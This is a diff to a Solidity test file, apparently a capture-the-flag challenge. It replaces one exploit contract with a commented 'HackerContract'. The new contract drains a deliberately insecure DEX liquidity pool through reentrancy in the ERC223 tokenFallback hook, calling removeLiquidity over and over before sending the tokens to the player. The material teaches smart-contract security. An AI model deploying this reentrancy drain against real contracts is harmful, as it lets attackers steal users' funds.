@@ -50,18 +50,15 @@ contract Challenge2Test is Test {
         //////////////////////////////*/      
 
         //============================//
-        Exploit exploit = new Exploit();
-        
-        exploit.setAll(address(token0), address(token1), target);
+        // Deploy our Hacker Contract
+        HackerContract hacker = new HackerContract(token0, token1, target);
 
-        token0.approve(address(exploit), 1 ether);
-        token0.transfer(address(exploit), 1 ether);
-        token1.approve(address(exploit), 1 ether);
-        token1.transfer(address(exploit), 1 ether);
+        // Transfer our tokens to the Hacker Contract
+        token0.transfer(address(hacker), 1 ether);
+        token1.transfer(address(hacker), 1 ether);
         
-        exploit.hack();
-        exploit.hack2();
-        exploit.sendTo(player);
+        // Execute the function hack inside our contract
+        hacker.hack();
 
         vm.stopPrank();
 
@@ -83,7 +80,7 @@ contract Challenge2Test is Test {
 ////////////////////////////////////////////////////////////*/
 
 
-contract Exploit {
+contract HackerContract {
 
     address public owner;
     uint public amount = 0;
@@ -91,50 +88,48 @@ contract Exploit {
     IERC20 public token1;
     InsecureDexLP public dex;
 
-  constructor() public payable {
-    owner = msg.sender;  
-  }
-
-    function setAll(address zeroToken, address firstToken, InsecureDexLP dex1) public payable {
-        token0 = IERC20(zeroToken); 
-        token1 = IERC20(firstToken);
+    constructor(IERC20 zeroToken, IERC20 firstToken, InsecureDexLP dex1) public payable {
+        owner = msg.sender;
+        token0 = zeroToken; 
+        token1 = firstToken;
         dex = dex1;
     }
 
-    function hack() external {  
-        token0.approve(address(dex), 10 ether);
-        token1.approve(address(dex), 10 ether);
+    function hack() external {
+        // First make an approve to the dex for token0 and token1
+        // So we can call addLiquidity
+        token0.approve(address(dex), 1 ether);
+        token1.approve(address(dex), 1 ether);
+        // We add liquidity to the dex
         dex.addLiquidity(1 ether, 1 ether);
-    }
-
-    function hack2() external {  
-        token0.approve(address(dex), 10 ether);
-        token1.approve(address(dex), 10 ether);
+        /*  
+            Call the removeLiquidity function
+            We're taking advantaje of that this tokens are ERC223
+            So if we have a tokenFallback function
+            This function is going to be executed every time we receive tokens
+        */
         dex.removeLiquidity(1 ether);
     }
 
-    function sendTo(address player) external {
-        token0.approve(address(dex), 10 ether);
-        token1.approve(address(dex), 10 ether);
-        token0.transfer(owner, 10 ether);
-        token1.transfer(owner, 10 ether);
-    }
-
     function tokenFallback(address sender, uint256 value, bytes memory) external {
-
-        if (sender == owner) {
-            amount += value;
-        } else {
-            if (token1.balanceOf(address(this)) < 10 ether) {
+        // We check that the sender isn't the owner
+        // Because be make a initial transfer to this contract from owner/player
+        // And we need to not execute this code
+        if (sender != owner) {
+            // We need to not execute this code when we already reach the 10 ether amount of tokens
+            // Otherwise remove liquidity
+            if (token0.balanceOf(address(this)) < 10 ether) {
                 console.log("dex token 1 {}", token1.balanceOf(address(dex)));
                 console.log("dex token 0 {}", token0.balanceOf(address(dex)));
                 console.log("contract token 1 {}", token1.balanceOf(address(this)));
                 console.log("contract token 0 {}", token0.balanceOf(address(this)));
-                console.log("player token 1 {}", token1.balanceOf(owner));
-                console.log("player token 0 {}", token0.balanceOf(owner));
+                console.log("-");
                 dex.removeLiquidity(1 ether);
+            } else {
+                // Finally transfer all the tokens to the player
+                token0.transfer(owner, 10 ether);
+                token1.transfer(owner, 10 ether);
             }
         }
-
     }
 }
